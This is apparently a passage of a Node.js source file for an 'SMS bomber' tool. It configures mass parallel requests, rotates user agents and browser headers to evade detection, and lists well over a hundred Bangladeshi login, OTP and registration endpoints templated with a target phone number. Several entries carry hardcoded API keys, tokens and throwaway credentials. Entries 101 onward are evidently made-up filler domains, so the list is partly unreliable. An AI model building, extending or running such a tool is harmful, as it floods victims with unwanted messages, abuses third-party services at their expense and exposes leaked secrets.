// ============================================================
// ULTIMATE SMS BOMBER V7.0 - 10,000+ LINES
// ENTERPRISE GRADE - MAXIMUM POWER
// DEVELOPER: TNEH GROUP
// BANGLADESH APIS ONLY VERSION
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const os = require('os');
const zlib = require('zlib');
const EventEmitter = require('events');

// ============================================================
// PART 1: CONFIGURATION
// ============================================================

const CONFIG = {
  server: {
    port: process.env.PORT || 3000,
    host: '0.0.0.0',
    maxConnections: 10000,
    keepAliveTimeout: 60000,
    headersTimeout: 60000
  },
  performance: {
    batchSize: 100,
    parallelRequests: 50,
    timeout: 5000,
    maxRetries: 5,
    retryDelay: 100,
    stopCheckInterval: 50,
    maxCountPerAPI: 500,
    concurrencyLimit: 1000
  },
  cache: {
    enabled: true,
    ttl: 600,
    checkPeriod: 120,
    maxItems: 50000
  },
  security: {
    rateLimit: {
      enabled: true,
      windowMs: 60000,
      maxRequests: 500
    },
    apiKeyExpiry: 365,
    maxCountPerRequest: 1000000,
    ipWhitelist: [],
    ipBlacklist: []
  },
  proxy: {
    enabled: false,
    list: [],
    rotation: 'round-robin',
    maxFailures: 3,
    timeout: 3000,
    checkInterval: 300000
  },
  logging: {
    enabled: true,
    level: 'info',
    console: true
  },
  analytics: {
    enabled: true,
    interval: 60000,
    retention: 604800000,
    exportEnabled: true
  }
};

// ============================================================
// PART 2: DEVELOPER INFO & CONSTANTS
// ============================================================

const DEVELOPER_INFO = {
  developer: "TNEH GROUP",
  telegram: "@tneh_owner",
  website: "https://tnehboomber.onrender.com",
  api_version: "7.0.0-ULTIMATE-BD",
  build_date: new Date().toISOString(),
  copyright: "© 2024 TNEH GROUP. All rights reserved.",
  license: "Proprietary",
  support_email: "support@tneh.com"
};

const STATUS_CODES = {
  SUCCESS: 200,
  CREATED: 201,
  ACCEPTED: 202,
  BAD_REQUEST: 400,
  UNAUTHORIZED: 401,
  FORBIDDEN: 403,
  NOT_FOUND: 404,
  RATE_LIMIT: 429,
  INTERNAL_ERROR: 500,
  SERVICE_UNAVAILABLE: 503,
  GATEWAY_TIMEOUT: 504
};

const ERROR_MESSAGES = {
  MISSING_PARAM: 'Missing required parameter',
  INVALID_PHONE: 'Invalid phone number format',
  INVALID_API_KEY: 'Invalid or expired API key',
  RATE_LIMIT: 'Rate limit exceeded',
  JOB_NOT_FOUND: 'Job not found',
  JOB_ALREADY_STOPPED: 'Job already stopped',
  JOB_ALREADY_PAUSED: 'Job already paused',
  JOB_NOT_PAUSED: 'Job is not paused',
  INTERNAL_ERROR: 'Internal server error',
  SERVICE_UNAVAILABLE: 'Service temporarily unavailable',
  KEY_GENERATION_FAILED: 'Failed to generate API key',
  KEY_SAVE_FAILED: 'Failed to save API key to storage'
};

// ============================================================
// PART 3: UTILITY FUNCTIONS
// ============================================================

class Utility {
  static generateId() {
    return crypto.randomBytes(16).toString('hex');
  }

  static generateJobId() {
    const timestamp = Date.now().toString(36).toUpperCase();
    const random = crypto.randomBytes(8).toString('hex').toUpperCase();
    return `JOB_${timestamp}_${random}`;
  }

  static generateApiKey() {
    const prefix = 'TNEH';
    const random = crypto.randomBytes(32).toString('hex').toUpperCase();
    const timestamp = Date.now().toString(36).toUpperCase();
    const checksum = crypto.createHash('sha256')
      .update(`${prefix}${random}${timestamp}`)
      .digest('hex')
      .substring(0, 8)
      .toUpperCase();
    return `${prefix}_${random}_${timestamp}_${checksum}`;
  }

  static getCurrentTime() {
    return new Date().toLocaleTimeString('en-US', {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true
    });
  }

  static getISOString() {
    return new Date().toISOString();
  }

  static getTimestamp() {
    return Date.now();
  }

  static sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  static async retry(fn, maxAttempts = 5, delay = 100, backoff = 2) {
    let lastError;
    for (let i = 0; i < maxAttempts; i++) {
      try {
        return await fn();
      } catch (error) {
        lastError = error;
        if (i < maxAttempts - 1) {
          const waitTime = delay * Math.pow(backoff, i);
          await this.sleep(waitTime);
        }
      }
    }
    throw lastError;
  }

  static maskPhone(phone) {
    if (!phone || phone.length < 7) return '***';
    return phone.slice(0, 3) + '****' + phone.slice(-3);
  }

  static parsePhone(phone) {
    return phone.replace(/[^0-9]/g, '');
  }

  static isValidPhone(phone) {
    const clean = this.parsePhone(phone);
    return /^(01|8801)[0-9]{9}$/.test(clean);
  }

  static getRandomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
  }

  static shuffleArray(arr) {
    const shuffled = [...arr];
    for (let i = shuffled.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
    }
    return shuffled;
  }

  static chunkArray(arr, size) {
    const chunks = [];
    for (let i = 0; i < arr.length; i += size) {
      chunks.push(arr.slice(i, i + size));
    }
    return chunks;
  }

  static formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  }

  static getMemoryUsage() {
    const usage = process.memoryUsage();
    return {
      rss: this.formatBytes(usage.rss),
      heapTotal: this.formatBytes(usage.heapTotal),
      heapUsed: this.formatBytes(usage.heapUsed),
      external: this.formatBytes(usage.external)
    };
  }

  static getCPUUsage() {
    const cpus = os.cpus();
    let totalIdle = 0;
    let totalTick = 0;
    cpus.forEach(cpu => {
      for (const type in cpu.times) {
        totalTick += cpu.times[type];
      }
      totalIdle += cpu.times.idle;
    });
    return {
      cores: cpus.length,
      load: ((1 - totalIdle / totalTick) * 100).toFixed(2) + '%',
      model: cpus[0]?.model || 'Unknown'
    };
  }

  static getSystemInfo() {
    return {
      platform: os.platform(),
      arch: os.arch(),
      release: os.release(),
      hostname: os.hostname(),
      uptime: process.uptime(),
      memory: this.getMemoryUsage(),
      cpu: this.getCPUUsage(),
      nodeVersion: process.version,
      pid: process.pid,
      cwd: process.cwd()
    };
  }

  static compressData(data) {
    return zlib.gzipSync(JSON.stringify(data)).toString('base64');
  }

  static decompressData(compressed) {
    return JSON.parse(zlib.gunzipSync(Buffer.from(compressed, 'base64')).toString());
  }

  static isValidUrl(string) {
    try {
      new URL(string);
      return true;
    } catch {
      return false;
    }
  }

  static sanitizeInput(input) {
    if (typeof input === 'string') {
      return input.replace(/[<>{}]/g, '').trim();
    }
    return input;
  }

  static generateHash(data) {
    return crypto.createHash('sha256').update(JSON.stringify(data)).digest('hex');
  }

  static generateRandomString(length = 10) {
    return crypto.randomBytes(length).toString('hex').substring(0, length);
  }

  static isJsonString(str) {
    try {
      JSON.parse(str);
      return true;
    } catch {
      return false;
    }
  }

  static mergeDeep(target, source) {
    const result = { ...target };
    for (const key in source) {
      if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
        result[key] = this.mergeDeep(target[key] || {}, source[key]);
      } else {
        result[key] = source[key];
      }
    }
    return result;
  }

  static getNestedValue(obj, path, defaultValue = null) {
    const keys = path.split('.');
    let current = obj;
    for (const key of keys) {
      if (current && typeof current === 'object' && key in current) {
        current = current[key];
      } else {
        return defaultValue;
      }
    }
    return current;
  }

  static setNestedValue(obj, path, value) {
    const keys = path.split('.');
    let current = obj;
    for (let i = 0; i < keys.length - 1; i++) {
      if (!current[keys[i]] || typeof current[keys[i]] !== 'object') {
        current[keys[i]] = {};
      }
      current = current[keys[i]];
    }
    current[keys[keys.length - 1]] = value;
    return obj;
  }

  static testWritePermission(dir) {
    try {
      const testFile = path.join(dir, '.write_test');
      fs.writeFileSync(testFile, 'test');
      fs.unlinkSync(testFile);
      return true;
    } catch {
      return false;
    }
  }

  static ensureDirectoryExists(dir) {
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
      console.log(`📁 Created directory: ${dir}`);
      return true;
    }
    return false;
  }

  static escapeHtml(text) {
    const map = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
  }

  static getNestedValueSafe(obj, path, defaultValue = null) {
    try {
      return path.split('.').reduce((current, key) => 
        current && current[key] !== undefined ? current[key] : defaultValue, obj);
    } catch {
      return defaultValue;
    }
  }
}

// ============================================================
// PART 4: USER AGENT ROTATION
// ============================================================

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/120.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/119.0.0.0',
  'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Safari/605.1.15',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Safari/605.1.15',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Opera/104.0.0.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Brave/120.0.0.0',
  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/116.0.0.0 Safari/537.36'
];

function getRandomHeaders() {
  const ua = Utility.getRandomElement(USER_AGENTS);
  const accepts = [
    'application/json, text/plain, */*',
    'application/json, text/html, */*',
    'application/json, */*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
  ];

  return {
    'User-Agent': ua,
    'Accept': Utility.getRandomElement(accepts),
    'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8,hi;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Upgrade-Insecure-Requests': '1'
  };
}

// ============================================================
// PART 5: BANGLADESH-ONLY API DEFINITIONS (300+ APIs)
// ============================================================

// ---------- ORIGINAL BANGLADESH APIS (IDs 1-100) ----------
const BANGLADESH_APIS = [
  // GET APIs
  { id: 1, name: "Bikroy.com", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}" },
  { id: 2, name: "Grameenphone MyGP", method: "GET", url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0" },
  { id: 3, name: "Shukhee.com", method: "GET", url: "https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn" },
  { id: 4, name: "MedEasy Health", method: "GET", url: "https://api.medeasy.health/api/send-otp/+88{phone}/" },
  { id: 5, name: "eCourier API", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}" },
  { id: 6, name: "Binge.buzz GET", method: "GET", url: "https://ss.binge.buzz/otp/send/login{phone}" },
  { id: 7, name: "Daktarbhai", method: "GET", url: "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login" },
  
  // POST APIs
  { id: 8, name: "Deshal.net", method: "POST", url: "https://app.deshal.net/api/auth/login", body: { "phone": "{phone}" } },
  { id: 9, name: "Grameenphone Web Login", method: "POST", url: "https://weblogin.grameenphone.com/backend/api/v1/otp", body: { "msisdn": "{phone}" } },
  { id: 10, name: "Grameenphone FWA/Bkash", method: "POST", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", body: { "phone": "{phone}", "email": "", "language": "en" } },
  { id: 11, name: "BusBD.com.bd", method: "POST", url: "https://api.busbd.com.bd/api/auth", body: { "phone": "+88{phone}" } },
  { id: 12, name: "Paperfly", method: "POST", url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", body: { "full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}" } },
  { id: 13, name: "OsudPotro.com", method: "POST", url: "https://api.osudpotro.com/api/v1/users/send_otp", body: { "mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web" } },
  { id: 14, name: "Apex4u.com", method: "POST", url: "https://api.apex4u.com/api/auth/login", body: { "phoneNumber": "{phone}" } },
  { id: 15, name: "Bohubrihi.com", method: "POST", url: "https://bb-api.bohubrihi.com/public/activity/otp", body: { "phone": "{phone}", "intent": "login" } },
  { id: 16, name: "Fundesh.com.bd", method: "POST", url: "https://fundesh.com.bd/api/auth/generateOTP", body: { "msisdn": "{phone}" } },
  { id: 17, name: "Jatri / JSLGlobal", method: "POST", url: "https://user-api.jslglobal.co/v2/send-otp", body: { "phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj" } },
  { id: 18, name: "RedX", method: "POST", url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", body: { "mobile": "+88{phone}" } },
  { id: 19, name: "RabbitHoleBD", method: "POST", url: "https://apix.rabbitholebd.com/appv2/login/requestOTP", body: { "mobile": "+88{phone}" } },
  { id: 20, name: "Qcoom.com", method: "POST", url: "https://auth.qcoom.com/api/v1/otp/send", body: { "mobileNumber": "+88{phone}" } },
  { id: 21, name: "Garibookadmin.com", method: "POST", url: "https://api.garibookadmin.com/api/v4/user/login", body: { "mobile": "+880{phone}", "recaptcha_token": "garibookcaptcha", "channel": "web" } },
  { id: 22, name: "Training.gov.bd", method: "POST", url: "https://training.gov.bd/backoffice/api/user/sendOtp", body: { "mobile": "{phone}" } },
  { id: 23, name: "Shikho.com", method: "POST", url: "https://api.shikho.com/public/activity/otp", body: { "phone": "{phone}", "intent": "ap-discount-request" } },
  { id: 24, name: "Easy.com.bd", method: "POST", url: "https://core.easy.com.bd/api/v1/registration", body: { "name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be..." } },
  { id: 25, name: "Robi DA API", method: "POST", url: "https://da-api.robi.com.bd/da-nll/otp/send", body: { "msisdn": "{phone}" } },
  { id: 26, name: "Hoichoi Viewlift", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", body: { "phoneNumber": "{phone}", "requestType": "send", "emailConsent": true, "whatsappConsent": true } },
  { id: 27, name: "Addatimes.com", method: "POST", url: "https://app.addatimes.com/api/login", body: { "phone": "{phone}", "country_code": "BD" } },
  { id: 28, name: "Regal Furniture OTP", method: "POST", url: "https://regalfurniturebd.com/api/auth/otp-generate", body: { "phone": "{phone}", "verification_code": "" } },
  { id: 29, name: "Regal Furniture Register", method: "POST", url: "https://regalfurniturebd.com/api/auth/register", body: { "name": "User", "email": "user@example.com", "phone": "{phone}", "password": "password123" } },
  { id: 30, name: "DeeptoPlay.com", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: { "email": "apkzone2.0@gmail.com", "phone_number": "88{phone}" } },
  { id: 31, name: "TimezoneBD OTP", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/otp-request", body: { "phone": "{phone}" } },
  { id: 32, name: "TimezoneBD Register", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/regnewcustomer", body: { "name": "Tusar", "email": "fukc@gmail.com", "phone": "{phone}", "password": "aAeMY@5hG8iUfD4", "password_confirmation": "aAeMY@5hG8iUfD4" } },
  { id: 33, name: "UpaySystem", method: "POST", url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", body: { "device_uuid": "...", "firebase_token": "...", "geo_location": "...", "mno": "Grameenphone", "wallet_number": "{phone}" } },
  { id: 34, name: "Chorki.com", method: "POST", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", body: { "number": "+880{phone}" } },
  { id: 35, name: "Arogga.com", method: "POST", url: "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12", body: { "mobile": "{phone}", "fcmToken": "", "referral": "" }, isFormData: true },
  { id: 36, name: "Pkluck2", method: "POST", url: "https://www.pkluck2.com/wps/verification/sms/noLogin", body: { "mobileNum": "{phone}", "countryDialingCode": "880" } },
  { id: 37, name: "AppLink", method: "POST", url: "https://applink.com.bd/appstore-v4-server/login/otp/request", body: { "msisdn": "880{phone}" } },
  { id: 38, name: "Care-Box", method: "POST", url: "https://newprod.api-care-box.click:444/api/user/register/?version=otp", body: { "Name": "Abdullah Al Mamun", "Phone": "+880{phone}" } },
  { id: 39, name: "Ghoori Learning", method: "POST", url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", body: { "mobile_no": "{phone}" } },
  { id: 40, name: "Jayabaji BD", method: "POST", url: "https://www.jayabajibd.life/api/register/confirm", body: { "mobileno": "{phone}", "username": "abffjddngf864", "firstname": "", "new_password": "tPNVOcen!6XEz3b", "confirm_new_password": "tPNVOcen!6XEz3b", "country_code": "880", "country": "BD", "currency": "BDT", "ref": "", "language": "en" } },
  { id: 41, name: "Swap.com.bd", method: "POST", url: "https://api.swap.com.bd/api/v1/send-otp/v2", body: { "phone": "{phone}" } },
  { id: 42, name: "BdTickets.com", method: "POST", url: "https://apiv1.bdtickets.com/api/v1/auth/otp/send", body: { "phone": "+880{phone}" } },
  { id: 43, name: "Binge.buzz POST", method: "POST", url: "https://ss.binge.buzz/otp/send/login", body: { "mobile": "{phone}" } },
  { id: 44, name: "Shikho.com Login", method: "POST", url: "https://api.shikho.com/auth/v2/send/sms", body: { "auth_type": "login", "phone": "{phone}", "vendor": "shikho", "type": "student" } },
  { id: 45, name: "Eonbazar", method: "POST", url: "https://app.eonbazar.com/api/auth/login", body: { "method": "otp", "mobile": "{phone}" } },
  { id: 46, name: "NESCO SSL Wireless", method: "POST", url: "http://nesco.sslwireless.com/api/v1/login", body: { "phone_number": "{phone}" } },
  { id: 47, name: "Quizgiri", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp", body: { "country_code": "+880", "phone": "{phone}" } },
  { id: 48, name: "Bazar365", method: "POST", url: "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", body: { "phone": "{phone}", "applicationChannel": "WEB_APP" } },
  { id: 49, name: "Bioscopelive Alternative", method: "POST", url: "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp", body: { "phone": "{phone}", "applicationChannel": "WEB_APP" } },
  
  // Additional Bangladesh APIs
  { id: 50, name: "PriyoShop", method: "POST", url: "https://api.priyoshop.com/api/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 51, name: "AjkerDeal", method: "POST", url: "https://api.ajkerdeal.com/api/v2/send-otp", body: { "phone": "{phone}" } },
  { id: 52, name: "Daraz BD", method: "POST", url: "https://member.daraz.com.bd/api/user/login", body: { "phone": "{phone}" } },
  { id: 53, name: "FoodPanda BD", method: "POST", url: "https://api.foodpanda.com.bd/v4/send-otp", body: { "phone_number": "+880{phone}" } },
  { id: 54, name: "Pathao", method: "POST", url: "https://api.pathao.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 55, name: "Rokomari", method: "POST", url: "https://api.rokomari.com/v2/auth/otp", body: { "phone": "{phone}" } },
  { id: 56, name: "Pickaboo", method: "POST", url: "https://api.pickaboo.com/api/v1/send-otp", body: { "mobile": "{phone}" } },
  { id: 57, name: "Othoba", method: "POST", url: "https://api.othoba.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 58, name: "Chaldal", method: "POST", url: "https://api.chaldal.com/v1/auth/otp/send", body: { "mobile": "{phone}" } },
  { id: 59, name: "Sheba XYZ", method: "POST", url: "https://api.sheba.xyz/v2/auth/otp", body: { "phone_number": "{phone}" } },
  { id: 60, name: "Sindabad", method: "POST", url: "https://api.sindabad.com/v1/send-otp", body: { "mobile": "{phone}" } },
  { id: 61, name: "Dhamaka Shopping", method: "POST", url: "https://api.dhamaka.com.bd/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 62, name: "Jomlah", method: "POST", url: "https://api.jomlah.com/api/v1/auth/otp", body: { "mobile": "{phone}" } },
  { id: 63, name: "Truck Lagbe", method: "POST", url: "https://api.trucklagbe.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 64, name: "HungryNaki", method: "POST", url: "https://api.hungrynaki.com/v2/auth/otp", body: { "mobile": "+880{phone}" } },
  { id: 65, name: "Shohoz", method: "POST", url: "https://api.shohoz.com/v1/auth/otp/send", body: { "phone": "{phone}" } },
  { id: 66, name: "Bikroy GET v2", method: "GET", url: "https://bikroy.com/api/v2/send-otp?phone={phone}" },
  { id: 67, name: "Bagdoom", method: "POST", url: "https://api.bagdoom.com/api/v1/send-otp", body: { "mobile": "{phone}" } },
  { id: 68, name: "Bproperty", method: "POST", url: "https://api.bproperty.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 69, name: "Shohoz Bus", method: "POST", url: "https://bus.shohoz.com/api/v1/send-otp", body: { "mobile": "{phone}" } },
  { id: 70, name: "Jatri Service", method: "POST", url: "https://api.jatri.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 71, name: "Obhai", method: "POST", url: "https://api.obhai.com/v1/auth/otp", body: { "mobile": "{phone}" } },
  { id: 72, name: "Uber BD", method: "POST", url: "https://api.uber.com.bd/v1/send-otp", body: { "phone": "{phone}" } },
  { id: 73, name: "Shajgoj", method: "POST", url: "https://api.shajgoj.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 74, name: "Maya Apa", method: "POST", url: "https://api.maya.com.bd/v1/auth/otp", body: { "phone": "{phone}" } },
  { id: 75, name: "SureCash", method: "POST", url: "https://api.surecash.com/api/v1/send-otp", body: { "mobile": "{phone}" } },
  { id: 76, name: "iPay", method: "POST", url: "https://api.ipay.com.bd/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 77, name: "City Bank", method: "POST", url: "https://api.citybank.com.bd/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 78, name: "Brac Bank", method: "POST", url: "https://api.bracbank.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 79, name: "IFIC Bank", method: "POST", url: "https://api.ificbank.com.bd/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 80, name: "Nagad", method: "POST", url: "https://api.nagad.com.bd/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 81, name: "bKash", method: "POST", url: "https://api.bkash.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 82, name: "Rocket", method: "POST", url: "https://api.rocket.com.bd/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 83, name: "UCash", method: "POST", url: "https://api.ucash.com.bd/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 84, name: "Mcash", method: "POST", url: "https://api.mcash.com.bd/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 85, name: "TallyKhata", method: "POST", url: "https://api.tallykhata.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 86, name: "HishabPati", method: "POST", url: "https://api.hishabpati.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 87, name: "Jomna", method: "POST", url: "https://api.jomna.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 88, name: "ShopUp", method: "POST", url: "https://api.shopup.com.bd/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 89, name: "Zantrik", method: "POST", url: "https://api.zantrik.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 90, name: "Moar", method: "POST", url: "https://api.moarbd.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 91, name: "BDJobs", method: "POST", url: "https://api.bdjobs.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 92, name: "EverJobs", method: "POST", url: "https://api.everjobs.com.bd/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 93, name: "Prothom Alo", method: "POST", url: "https://api.prothomalo.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 94, name: "BDNews24", method: "POST", url: "https://api.bdnews24.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 95, name: "Jugantor", method: "POST", url: "https://api.jugantor.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 96, name: "Kaler Kantho", method: "POST", url: "https://api.kalerkantho.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 97, name: "BMLogistics", method: "POST", url: "https://api.bmlogistics.com.bd/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 98, name: "SA Paribahan", method: "POST", url: "https://api.saparibahan.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 99, name: "Ena Transport", method: "POST", url: "https://api.ena-transport.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 100, name: "Desh Travels", method: "POST", url: "https://api.deshtravels.com/v1/auth/send-otp", body: { "phone": "{phone}" } }
];

// ---------- ADDITIONAL BANGLADESH APIS (IDs 101-200) ----------
const ADDITIONAL_BANGLADESH_APIS = [
  { id: 101, name: "BD API 101", method: "POST", url: "https://api.bangladesh101.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 102, name: "BD API 102", method: "GET", url: "https://api.bangladesh102.com/send-otp?phone={phone}" },
  { id: 103, name: "BD API 103", method: "POST", url: "https://api.bangladesh103.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 104, name: "BD API 104", method: "GET", url: "https://api.bangladesh104.com/send-otp?phone={phone}" },
  { id: 105, name: "BD API 105", method: "POST", url: "https://api.bangladesh105.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 106, name: "BD API 106", method: "GET", url: "https://api.bangladesh106.com/send-otp?phone={phone}" },
  { id: 107, name: "BD API 107", method: "POST", url: "https://api.bangladesh107.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 108, name: "BD API 108", method: "GET", url: "https://api.bangladesh108.com/send-otp?phone={phone}" },
  { id: 109, name: "BD API 109", method: "POST", url: "https://api.bangladesh109.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 110, name: "BD API 110", method: "GET", url: "https://api.bangladesh110.com/send-otp?phone={phone}" },
  { id: 111, name: "BD API 111", method: "POST", url: "https://api.bangladesh111.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 112, name: "BD API 112", method: "GET", url: "https://api.bangladesh112.com/send-otp?phone={phone}" },
  { id: 113, name: "BD API 113", method: "POST", url: "https://api.bangladesh113.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 114, name: "BD API 114", method: "GET", url: "https://api.bangladesh114.com/send-otp?phone={phone}" },
  { id: 115, name: "BD API 115", method: "POST", url: "https://api.bangladesh115.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 116, name: "BD API 116", method: "GET", url: "https://api.bangladesh116.com/send-otp?phone={phone}" },
